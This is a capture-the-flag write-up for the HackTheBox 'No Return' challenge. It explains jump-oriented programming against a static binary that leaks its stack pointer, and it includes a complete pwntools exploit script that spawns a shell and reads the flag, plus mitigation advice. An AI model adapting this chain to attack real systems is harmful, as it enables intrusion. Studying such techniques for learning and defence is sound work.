## Overview

No Return is a HackTheBox Pwn challenge (Hard). The binary is a ~4.5&nbsp;KB **statically-linked, stripped, hand-written-assembly** ELF. The interesting twist is right in the name: almost every gadget ends in an indirect `jmp`, not a `ret`. `ropper` finds a single `ret` in the whole file, so a classic ROP chain is impossible. The intended solution is **Jump-Oriented Programming (JOP)** — a dispatcher gadget that walks a table of gadget pointers, chained together entirely through `jmp [reg]`.

The binary also hands you everything you need: it leaks its own stack pointer and then `read()`s a buffer at a known offset before jumping into it, so every address is known and you get full control of the instruction pointer with no [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) needed — the program jumps into attacker-controlled data by design.

## The technique

The entry stub does three things that make this exploitable:

```
push rsp                 ; save the current stack pointer on the stack
mov rax,1; mov rdi,1; mov rsi,rsp; mov edx,8; syscall   ; write(1, &saved_rsp, 8)  -> LEAKS a stack address
sub rsi,0xb0
xor rax; xor rdi; mov edx,0xc0; syscall                 ; read(0, leak-0xb8, 0xc0)  (192 bytes in)
add rsp,8
jmp [rsp-8]                                              ; jump into the buffer we just filled
```

So the program writes its own saved `rsp` to stdout (an 8-byte stack leak), reads 192 bytes into a buffer at a fixed offset below that leak, and finally `jmp`s to a value inside that buffer with `rsp` re-pointed into it too. With the leak we know the exact address of every byte we send.

The gadgets that matter:

```
0x401000  pop rsp; pop rdi; pop rsi; pop rbp; pop rdx; pop rcx; pop rbx; xor rax,rax; jmp [rdi+1]   ; init/pivot
0x40103c  add rbp,rbx; jmp [rbp-0x39]                 ; DISPATCHER (walks a table, stride rbx=8)
0x401067  xchg rdi,rcx; jmp [rdx]                     ; load rdi
0x40101c  mov rcx,rsp; jmp [rdx]
0x40104c  pop rcx; mov rcx,rdx; pop rdx; jmp [rcx]    ; set rdx (=59)
0x40105a  xchg rdx,rax; jmp [rcx]                     ; rax <- rdx (=59), rdx <- 0
0x401099  syscall
```

The key insight is how you keep the chain going. The dispatcher at `0x40103c` does `add rbp,rbx; jmp [rbp-0x39]` — with `rbx=8` it advances through a table of gadget pointers laid inside your buffer. To make each functional gadget *return* to the dispatcher for free, you plant the dispatcher's address as a qword in the buffer and set **`rdx = rcx = &(that qword)`**. Now every gadget that ends in `jmp [rdx]` or `jmp [rcx]` bounces straight back to the dispatcher with no extra plumbing.

## Solution

Everything is known-address, so the plan is `execve("/bin/sh", 0, 0)`:

1. `jmp [rsp-8]` lands on the pivot gadget `0x401000`, which pops every register (including a new `rsp` that re-points into the buffer) and jumps into the dispatcher.
2. The dispatcher walks the gadget table: `xchg rdi,rcx` loads `rdi = &"/bin/sh"`, `rsi` stays `0`, then `rdx` is set to `59` and `xchg rdx,rax` moves it into `rax` while zeroing `rdx` (the third `execve` argument).
3. The final table entry is a bare `syscall` → shell.

Because the binary is fully static, the exact same payload runs identically on the local Kali box and on the remote target — no libc version mismatch to worry about. Develop the whole chain against a local `process()`, then just re-point it at the remote host.

```python
#!/usr/bin/env python3
from pwn import *
import sys
context.arch = 'amd64'

io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else process('./no-return')

stackleak = u64(io.recv(8))          # entry stub leaks its own saved rsp
bufferbase = stackleak - 0xb0         # the pivot's pop-rsp value; payload[0] sits at leak-0xb8

payload = b''.join([
    p64(0x40103c),                    # offset 0: dispatcher qword (rdx/rcx anchor here)
    p64(bufferbase - 0x8 - 0x1),      # rdi -> [rdi+1] = &dispatcher
    p64(0),                           # rsi = 0
    p64(bufferbase + 0x30 + 0x8 + 0x39),  # rbp: dispatch-table anchor
    p64(bufferbase - 0x8),            # rdx = &dispatcher
    p64(bufferbase - 0x8),            # rcx = &dispatcher
    p64(0x8),                         # rbx = table stride
    b"/bin/sh\x00",
    p64(59),                          # execve syscall number
    p64(0x401067),                    # table: xchg rdi,rcx  -> rdi = &"/bin/sh"
    p64(0x40101c),                    # table: mov rcx,rsp
    p64(0x401067),                    # table: xchg rdi,rcx
    p64(0x40104c),                    # table: set rdx = 59
    p64(0x40105a),                    # table: xchg rdx,rax  -> rax = 59, rdx = 0
    p64(0x401099),                    # table: syscall  -> execve("/bin/sh", 0, 0)
]).ljust(0xb0, b'A') + p64(0x401000) + p64(bufferbase)   # jmp target = pivot; pop-rsp value

io.send(payload)
io.sendline(b'cat /home/*/*flag*.txt')   # flag file has a randomized name
io.interactive()
```

Running it drops a shell as the `ctf` user; the flag lives at `/home/ctf/<random-hex>-flag.txt` (find it with `find / -iname '*flag*'`):

```
HTB{...}
```

## Why it worked

The binary is hand-written assembly with no stack protections (No PIE, no canary, no RELRO — only NX). It voluntarily leaks a stack pointer and reads attacker data into a known location before jumping into it, giving full instruction-pointer control. Even with almost no `ret` gadgets, the curated set of indirect-`jmp` gadgets is enough to build a Turing-complete dispatcher — Jump-Oriented Programming is simply ROP where the "return" is an indirect jump you steer with a register.

## Fix / defense

- Never leak stack (or any) pointers back to the client — the self-leak is what makes the whole buffer addressable.
- Enable the standard mitigations that were absent here: PIE + a stack canary would remove the fixed addresses and the free RIP control.
- Intel CET / IBT (`endbr64` landing pads) breaks JOP directly: indirect jumps into the middle of gadgets would fault, because none of these gadget entry points are valid indirect-branch targets.
